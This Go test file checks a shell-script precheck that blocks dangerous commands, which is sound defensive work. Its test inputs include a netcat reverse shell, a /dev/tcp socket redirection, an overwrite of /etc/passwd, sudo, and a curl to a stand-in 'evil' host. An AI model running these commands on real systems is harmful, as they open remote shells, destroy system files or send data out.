package scriptexec

import (
	"strings"
	"testing"
)

func TestPrecheckShell_BenignScript_NotBlocked(t *testing.T) {
	src := `curl -s "https://example.test/api/1" > ` + ScratchDir + "/out.json\n"
	got, err := precheckShell(src, mustScope(t, "example.test"))
	if err != nil {
		t.Fatalf("precheckShell: %v", err)
	}
	if got.Blocked {
		t.Fatalf("got blocked, reasons=%v", got.Reasons)
	}
}

func TestPrecheckShell_SubshellSpawn_Blocked(t *testing.T) {
	got, err := precheckShell("bash -c 'echo hi'\n", nil)
	if err != nil {
		t.Fatalf("precheckShell: %v", err)
	}
	if !got.Blocked {
		t.Fatal("want blocked for spawning another shell")
	}
}

func TestPrecheckShell_NetcatReverseShell_Blocked(t *testing.T) {
	got, err := precheckShell("nc -e /bin/sh 10.0.0.1 4444\n", nil)
	if err != nil {
		t.Fatalf("precheckShell: %v", err)
	}
	if !got.Blocked {
		t.Fatal("want blocked for netcat")
	}
}

func TestPrecheckShell_DevTCPRawSocket_Blocked(t *testing.T) {
	got, err := precheckShell("exec 3<>/dev/tcp/10.0.0.1/4444\n", nil)
	if err != nil {
		t.Fatalf("precheckShell: %v", err)
	}
	if !got.Blocked {
		t.Fatal("want blocked for /dev/tcp raw socket redirection")
	}
}

func TestPrecheckShell_FileWriteOutsideScratch_Blocked(t *testing.T) {
	got, err := precheckShell("echo pwned > /etc/passwd\n", nil)
	if err != nil {
		t.Fatalf("precheckShell: %v", err)
	}
	if !got.Blocked {
		t.Fatal("want blocked for redirect outside scratch dir")
	}
}

func TestPrecheckShell_SudoPrivilegeEscalation_Blocked(t *testing.T) {
	got, err := precheckShell("sudo whoami\n", nil)
	if err != nil {
		t.Fatalf("precheckShell: %v", err)
	}
	if !got.Blocked {
		t.Fatal("want blocked for sudo")
	}
}

func TestPrecheckShell_OutOfScopeHostLiteral_Blocked(t *testing.T) {
	got, err := precheckShell(`curl "https://evil.example.com/steal"`+"\n", mustScope(t, "example.test"))
	if err != nil {
		t.Fatalf("precheckShell: %v", err)
	}
	if !got.Blocked {
		t.Fatal("want blocked for out-of-scope host literal")
	}
}

func TestPrecheckShell_SyntaxError_Blocked(t *testing.T) {
	got, err := precheckShell("if [ true\n", nil)
	if err != nil {
		t.Fatalf("precheckShell: %v", err)
	}
	if !got.Blocked || !strings.Contains(strings.Join(got.Reasons, " "), "syntax error") {
		t.Fatalf("got %+v, want blocked with a syntax error reason", got)
	}
}
